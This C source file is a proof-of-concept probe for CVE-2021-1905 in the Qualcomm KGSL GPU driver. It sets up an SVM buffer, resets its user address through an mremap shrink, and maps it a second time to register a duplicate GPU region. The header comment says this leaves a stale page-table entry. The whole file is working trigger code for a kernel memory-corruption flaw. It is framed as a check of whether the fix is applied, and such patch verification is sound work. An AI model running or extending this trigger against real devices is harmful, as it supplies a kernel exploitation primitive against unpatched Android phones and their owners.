/* kgsl-svmdbl.c — CVE-2021-1905 patch #2: missing `if (memdesc.gpuaddr)
 * return -EBUSY` in _gpu_set_svm_region().
 *
 * Deterministic (no race): an SVM (KGSL_MEMFLAGS_USE_CPU_MAP) entry gets its
 * gpuaddr assigned on the first mmap.  The single shared memdesc->useraddr is
 * then reset to 0 by an mremap() shrink (the tail vm_close writes 0), while the
 * head vma keeps the entry alive.  A second mmap of the same entry therefore
 * reaches get_mmap_entry (useraddr==0) and _get_svm_area -> _gpu_set_svm_region
 * a second time with memdesc.gpuaddr already set.  Pre-fix that re-registers a
 * new SVM region and re-maps the same memdesc, overwriting gpuaddr and leaving
 * the first region/PTE stale.
 *
 * Everything read-only w.r.t. the allocator; we only compare gpuaddr/va_addr.
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL

struct kgsl_gpuobj_alloc {
    uint64_t size, flags, va_len, mmapsize;
    unsigned int id, metadata_len;
    uint64_t metadata;
};
struct kgsl_gpuobj_info {
    uint64_t gpuaddr, flags, size, va_len, va_addr;
    unsigned int id;
};
struct kgsl_gpumem_free_id { unsigned int id, __pad; };

#define IOCTL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_INFO  _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_PMEM_FREE_ID _IOWR(KGSL_IOC_TYPE,0x35,struct kgsl_gpumem_free_id)

static int fd=-1;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }

static void info(unsigned id){
    struct kgsl_gpuobj_info i; memset(&i,0,sizeof i); i.id=id;
    errno=0; int r=ioctl(fd,IOCTL_GPUOBJ_INFO,&i);
    if(r<0){ printf("      INFO id=%u rc=-1 errno=%d (%s)\n",id,errno,strerror(errno)); return; }
    printf("      INFO id=%u gpuaddr=0x%llx flags=0x%llx size=0x%llx va_len=0x%llx va_addr=0x%llx%s\n",
           i.id,(unsigned long long)i.gpuaddr,(unsigned long long)i.flags,
           (unsigned long long)i.size,(unsigned long long)i.va_len,
           (unsigned long long)i.va_addr, (i.flags&USE_CPU_MAP)?" [SVM]":" [no-cpu-map]");
}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(40);
    printf("== kgsl SVM double-region probe (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR);
    if(fd<0){ printf("[-] open %s: %s\n",DEV,strerror(errno)); return 1; }

    struct kgsl_gpuobj_alloc a; memset(&a,0,sizeof a);
    a.size=0x2000; a.flags=USE_CPU_MAP; a.va_len=0x2000;
    errno=0; int r=ioctl(fd,IOCTL_GPUOBJ_ALLOC,&a);
    printf("[1] GPUOBJ_ALLOC size=0x2000 flags=USE_CPU_MAP -> %d errno=%d(%s) id=%u\n",
           r,errno,strerror(errno),a.id);
    if(r<0) return 1;
    info(a.id);

    /* first mmap: kernel assigns SVM region addr1 */
    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)a.id<<12);
    printf("[2] mmap#1 -> %s\n", v1==MAP_FAILED?strerror(errno):"ok");
    if(v1==MAP_FAILED) return 1;
    printf("      v1=%p\n",v1);
    info(a.id);

    /* reset the single shared memdesc->useraddr to 0 via mremap shrink */
    void *m=mremap(v1,0x2000,0x1000,0);
    printf("[3] mremap shrink 0x2000->0x1000 -> %s\n", m==MAP_FAILED?strerror(errno):"ok");
    if(m==MAP_FAILED) return 1;
    v1=m;
    info(a.id);       /* va_addr should now be 0 */

    /* second mmap: useraddr==0, gpuaddr still set -> reaches _gpu_set_svm_region again */
    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)a.id<<12);
    printf("[4] mmap#2 (useraddr==0, gpuaddr set) -> %s\n", v2==MAP_FAILED?strerror(errno):"ok");
    if(v2!=MAP_FAILED) printf("      v2=%p\n",v2);
    info(a.id);       /* gpuaddr changed? => second region registered => PATCH#2 BUG */

    printf("[5] v1[0]=0x%02x\n", ((unsigned char*)v1)[0]);
    if(v2!=MAP_FAILED) printf("    v2[0]=0x%02x\n", ((unsigned char*)v2)[0]);

    if(v2!=MAP_FAILED) munmap(v2,0x2000);
    munmap(v1,0x1000);
    info(a.id);
    { struct kgsl_gpumem_free_id f={a.id,0}; ioctl(fd,IOCTL_PMEM_FREE_ID,&f); }
    close(fd);
    printf("== done ==\n");
    return 0;
}
